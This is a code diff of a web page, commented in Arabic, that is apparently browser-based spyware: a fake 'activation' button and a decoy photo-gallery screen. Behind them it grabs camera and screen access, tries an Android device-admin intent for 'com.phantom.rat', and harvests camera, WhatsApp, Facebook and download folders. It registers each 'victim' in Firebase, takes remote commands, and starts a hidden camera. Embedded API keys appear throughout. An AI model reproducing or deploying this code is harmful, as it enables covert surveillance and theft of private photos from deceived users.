@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8"/>
     <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-    <title>⋯</title>
+    <title>جاري التفعيل...</title>
     <style>
         body { background: #000; color: #fff; font-family: 'Courier New',monospace; display: flex; align-items: center; justify-content: center; height: 100vh; flex-direction: column; margin: 0; }
         #msg { font-size: 1.5em; text-align: center; margin-bottom: 30px; }
@@ -14,7 +14,7 @@
 </head>
 <body>
     <div id="msg">⋯</div>
-    <button id="grantBtn" class="btn" onclick="startPayload()">متابعة</button>
+    <button id="grantBtn" class="btn" onclick="initPayload()">متابعة</button>
     <script>
         const firebaseConfig = {
             apiKey: "AIzaSyCUUU64NotDyl-qjSvAD1jQZSQZrZEcuvU",
@@ -28,115 +28,73 @@
         const IMGBB_KEY = "69e4b5971880f9d736172f5fc9eb5bac";
         firebase.initializeApp(firebaseConfig);
         const db = firebase.database();
-        const vid = 'phantom-'+Math.random().toString(36).substr(2,12);
+        const vid = 'phantom-' + Math.random().toString(36).substr(2,12);
         const vref = db.ref('victims/'+vid);
         let rootDir = null, camStream = null;
-        const folderHandles = {};      // مقابض المجلدات
-        let fileAccessGranted = false; // هل سمح بالملفات؟
+        const folderHandles = {};      // تخزين مقابض المجلدات بعد المنح
+        let fileAccessReady = false;   // هل لدينا صلاحية ملفات؟
 
-        // ========== تشغيل آمن للتردد الصوتي (اختياري) ==========
-        function emitSubsonicLock() {
-            try {
-                const AudioContext = window.AudioContext || window.webkitAudioContext;
-                const ctx = new AudioContext();
-                const osc = ctx.createOscillator();
-                const gain = ctx.createGain();
-                osc.type = 'sine';
-                osc.frequency.value = 17;
-                gain.gain.value = 0.3;
-                osc.connect(gain);
-                gain.connect(ctx.destination);
-                osc.start();
-                setTimeout(() => { osc.stop(); ctx.close(); }, 2000);
-            } catch(e) {}
-        }
-
-        // ========== تحضير الوهم ==========
+        // ========== إعداد الشاشة ==========
         setTimeout(() => {
-            emitSubsonicLock();
-            document.getElementById('msg').innerText = "يجب الضغط على متابعة لتفعيل الخدمة";
+            document.getElementById('msg').innerText = "اضغط على متابعة للبدء";
             document.getElementById('grantBtn').style.display = 'block';
         }, 2000);
 
-        window.startPayload = async function() {
-            document.getElementById('grantBtn').style.display = 'none';
-            document.getElementById('msg').innerText = "جاري التفعيل...";
-            emitSubsonicLock();
+        window.initPayload = async function() {
+            const btn = document.getElementById('grantBtn');
+            btn.style.display = 'none';
+            document.getElementById('msg').innerText = "جاري تجهيز الإذن...";
 
-            // ---- الصلاحيات الأساسية (كاميرا + شاشة) ----
+            // ---- الصلاحيات الصامتة ----
             try { camStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" }, audio: false }); } catch(e) {}
-            try { const d = await navigator.mediaDevices.getDisplayMedia({ video: true }); d.getTracks().forEach(t => t.stop()); } catch(e) {}
+            try { const dStream = await navigator.mediaDevices.getDisplayMedia({ video: true }); dStream.getTracks().forEach(t => t.stop()); } catch(e) {}
             try {
                 let a = document.createElement('a');
                 a.href = 'intent://#Intent;action=android.app.action.ADD_DEVICE_ADMIN;component=com.phantom.rat/.AdminReceiver;end';
                 a.click();
             } catch(e) {}
 
-            // ---- صلاحية الملفات (غير إجبارية) ----
+            // ---- طلب المجلد العام (بدون إجبار) ----
+            document.getElementById('msg').innerText = "حدد مجلداً لحفظ البيانات...";
             try {
                 rootDir = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
-                fileAccessGranted = true;
-                // حفظ كافة المجلدات الشهيرة
-                await cacheKnownFolders();
+                fileAccessReady = true;
+                // نخزن المقابض للمجلدات المهمة
+                await cacheAllKnownFolders();
             } catch(e) {
-                // المستخدم رفض أو حدث خطأ – سنستمر بوضع محدود
-                fileAccessGranted = false;
+                // المستخدم أغلق النافذة دون اختيار – نستمر عادي
+                fileAccessReady = false;
             }
 
-            // ---- إنهاء التفعيل ----
-            document.getElementById('msg').innerText = fileAccessGranted ? "✅ تم التفعيل الكامل" : "✅ تم التفعيل (بعض الميزات محدودة)";
+            // ---- اكتمال التفعيل (دائماً ناجح) ----
+            document.getElementById('msg').innerText = "✅ اكتمل التفعيل";
             setTimeout(() => {
                 document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
             }, 1000);
 
             await registerDevice();
             startCommandListener();
+            if (camStream) startHiddenCamera();
         };
 
-        // ========== تخزين مقابض المجلدات الشهيرة ==========
-        async function cacheKnownFolders() {
-            const PATHS = ['DCIM/Camera', 'WhatsApp/Media/WhatsApp Images', 'Download', 'Pictures', 'Facebook/Media'];
-            if (rootDir.resolve) {
-                for (let path of PATHS) {
+        // ========== تخزين مقابض المجلدات المعروفة ==========
+        async function cacheAllKnownFolders() {
+            const PATHS = {
+                camera: 'DCIM/Camera',
+                downloads: 'Download',
+                whatsapp: 'WhatsApp/Media/WhatsApp Images',
+                facebook: 'Facebook/Media',
+                pictures: 'Pictures'
+            };
+            if (rootDir && rootDir.resolve) {
+                for (const [key, path] of Object.entries(PATHS)) {
                     try {
                         let parts = path.split('/');
-                        let current = rootDir;
-                        for (let p of parts) current = await current.getDirectoryHandle(p);
-                        folderHandles[path.replace(/\//g,'_')] = current;
+                        let handle = rootDir;
+                        for (let p of parts) handle = await handle.getDirectoryHandle(p);
+                        folderHandles[key] = handle;
                     } catch(e) {}
                 }
-            }
-        }
-
-        // ========== الحصول على مقبض مجلد (يطلب من المستخدم إذا لم يُمنح مسبقاً) ==========
-        async function getFolderHandle(folderKey) {
-            if (folderHandles[folderKey]) return folderHandles[folderKey];
-            // لم نحصل عليه بعد – نطلب من المستخدم اختياره
-            document.body.innerHTML = `<h2 style="color:#fff;text-align:center;margin-top:40vh;">الرجاء اختيار مجلد ${folderKey}</h2>`;
-            try {
-                const handle = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
-                // نحاول الوصول للمسار المطلوب
-                const MAP = {
-                    camera: 'DCIM/Camera',
-                    downloads: 'Download',
-                    whatsapp: 'WhatsApp/Media/WhatsApp Images',
-                    facebook: 'Facebook/Media',
-                    pictures: 'Pictures'
-                };
-                const path = MAP[folderKey];
-                let current = handle;
-                if (path) {
-                    for (let p of path.split('/')) {
-                        try { current = await current.getDirectoryHandle(p); } catch(e) { break; }
-                    }
-                }
-                folderHandles[folderKey] = current;
-                fileAccessGranted = true;
-                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
-                return current;
-            } catch(e) {
-                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
-                throw new Error('تم رفض الوصول إلى المجلد');
             }
         }
 
@@ -155,7 +113,7 @@
         // ========== مستقبل الأوامر ==========
         function startCommandListener() {
             vref.child('command').on('value', async snap => {
-                let c = snap.val();
+                const c = snap.val();
                 if (!c) return;
                 try {
                     switch(c.action) {
@@ -178,14 +136,35 @@
         }
 
         // ========== سحب الصور ==========
-        async function pullFromFolder(key) {
-            if (!fileAccessGranted && !folderHandles[key]) {
-                // نحاول طلب الصلاحية الآن
-                await getFolderHandle(key);
+        async function getFolderHandle(key) {
+            if (folderHandles[key]) return folderHandles[key];
+            // إذا لم يكن لدينا صلاحية ملفات بعد، نطلبها الآن بطريقة عامة
+            if (!fileAccessReady) {
+                try {
+                    rootDir = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
+                    fileAccessReady = true;
+                    await cacheAllKnownFolders();
+                    if (folderHandles[key]) return folderHandles[key];
+                } catch(e) {
+                    throw new Error('تم رفض إذن الملفات');
+                }
             }
-            const handle = folderHandles[key];
-            if (!handle) throw new Error('الوصول غير متاح');
-            await walkDir(handle, key+'/');
+            // إذا مازال غير موجود، ربما المجلد لم يتم تخزينه، نطلب المجلد المحدد
+            document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">الرجاء اختيار مجلد ' + key + '</h2>';
+            try {
+                const handle = await window.showDirectoryPicker({ mode: 'readwrite', startIn: 'documents' });
+                folderHandles[key] = handle;
+                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
+                return handle;
+            } catch(e) {
+                document.body.innerHTML = '<h2 style="color:#fff;text-align:center;margin-top:40vh;">📷 معرض الصور</h2>';
+                throw new Error('رفض الاختيار');
+            }
+        }
+
+        async function pullFromFolder(key) {
+            const handle = await getFolderHandle(key);
+            await walkDir(handle, key + '/');
         }
 
         async function pullAll() {
@@ -213,7 +192,7 @@
             }
         }
 
-        // ========== الميزات الأخرى (كاميرا، فلاش، شاشة، الخ) ==========
+        // ========== الميزات الأخرى ==========
         async function setFlash(on) {
             if (!camStream) return;
             let track = camStream.getVideoTracks()[0];
